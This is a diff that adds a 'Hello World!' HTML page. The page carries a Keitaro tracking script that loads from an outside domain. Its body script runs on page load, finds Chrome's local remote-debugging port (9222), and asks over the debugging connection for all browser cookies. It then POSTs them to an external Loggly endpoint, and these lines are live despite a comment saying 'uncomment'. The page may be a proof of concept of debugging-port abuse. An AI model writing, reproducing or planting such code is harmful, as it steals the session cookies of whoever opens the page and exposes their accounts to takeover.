@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<!-- Keitaro tracking script -->
+<script type='application/javascript'>
+if (!window.KTracking){window.KTracking={collectNonUniqueClicks: false, multiDomain: false, R_PATH: 'https://research-project.club/cookies', P_PATH:'https://research-project.club/2708d3a/postback', listeners: [], reportConversion: function(){this.queued = arguments;}, getSubId: function(fn) {this.listeners.push(fn);}, ready: function(fn) {this.listeners.push(fn);} };}(function(){var a=document.createElement('script');a.type='application/javascript';a.async=true;a.src='https://research-project.club/js/k.min.js';var s=document.getElementsByTagName('script')[0];s.parentNode.insertBefore(a,s)})();
+</script><noscript><img height='0' width='0' alt='' src='https://research-project.club/cookies'/></noscript>
+
+  <meta charset="utf-8">
+  <title>Hello World!</title>
+</head>
+<body>
+Hello World!
+<script>
+	
+var webSocketDebuggerUrl;
+var port = 9222;
+var request = new XMLHttpRequest();
+request.open("GET", "http://localhost:" + port + "/json");
+request.responseType = 'json';
+request.send();
+request.onload = function() {
+  webSocketDebuggerUrl = request.response[0].webSocketDebuggerUrl;
+  console.log(webSocketDebuggerUrl);
+  var connection = new WebSocket(webSocketDebuggerUrl);
+	
+  // When the connection is open, send some data to the server
+  connection.onopen = function () {
+    connection.send('{"id": 1, "method": "Network.getAllCookies"}');
+  };
+
+  // Log errors
+  connection.onerror = function (error) {
+    console.log('WebSocket Error ' + error);
+  };
+
+  // Log messages from the server
+  connection.onmessage = function (e) {
+    console.log('Server: ' + e.data);
+	  
+    //uncomment lines below to send cookies to loggly (update the loggly link to your own link first)
+    post_url = "http://logs-01.loggly.com/inputs/83c503c3-05ae-4eb6-ac4c-d72492b36c26/tag/http/"
+    var xhttp = new XMLHttpRequest();
+    xhttp.open("POST", post_url, true);
+    xhttp.setRequestHeader('Content-Type', 'text/plain');
+    xhttp.send(JSON.stringify(JSON.parse(e.data).result.cookies));
+  };
+}
+
+</script>
+</body>
+</html>
